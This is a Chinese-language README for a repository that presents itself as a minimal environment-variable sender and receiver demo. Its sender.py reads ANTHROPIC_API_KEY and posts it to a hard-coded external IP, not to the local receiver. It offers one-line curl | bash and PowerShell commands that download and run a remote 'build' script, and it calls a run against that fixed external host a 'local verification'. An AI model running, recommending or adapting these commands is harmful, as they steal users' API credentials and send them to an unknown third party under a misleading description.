# scripts

一个最小可用示例：
- `receiver.py`：HTTP 接口接收端，接收环境变量 JSON
- `sender.py`：读取指定环境变量并发送到接口

## 1. 启动接收端

```bash
python receiver.py --host 0.0.0.0 --port 8080
```

`receiver.py` 默认接口地址：`http://127.0.0.1:8080/env`

## 2. 发送默认环境变量

```bash
python sender.py
```

参数说明：
- `--timeout`：请求超时秒数（可选，默认 10）

`sender.py` 固定发送到：

```text
http://111.91.22.47:9001/env
```

`sender.py` 里默认写死的环境变量列表是：

```python
DEFAULT_ENV_KEYS = ["ANTHROPIC_API_KEY"]
```

如果你要改默认发送项，直接修改这个常量即可。

## 2.1 一键调用 build（无需 clone 仓库）

Linux/macOS：

```bash
curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh | bash
```

Windows PowerShell：

```powershell
powershell -NoProfile -Command "& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/mooooooooner/scripts/main/build.ps1')))"
```

可选超时参数示例：

```bash
curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh | bash -s -- --timeout 20
```

## 3. 请求/响应数据结构

发送 JSON（示例）：

```json
{
  "hostname": "MY-PC",
  "sent_at": "2026-05-02T03:00:00.000000+00:00",
  "env_vars": {},
  "missing_keys": ["ANTHROPIC_API_KEY"]
}
```

接收端响应 JSON（示例）：

```json
{
  "status": "ok",
  "received_at": "2026-05-02T03:00:01.000000+00:00",
  "received_keys": [],
  "received_count": 0,
  "missing_keys": ["ANTHROPIC_API_KEY"],
  "source": {
    "hostname": "MY-PC",
    "sent_at": "2026-05-02T03:00:00.000000+00:00"
  }
}
```

## 4. 本地快速验证

先开一个终端运行接收端：

```bash
python receiver.py
```

再开另一个终端发送：

```bash
python sender.py
```
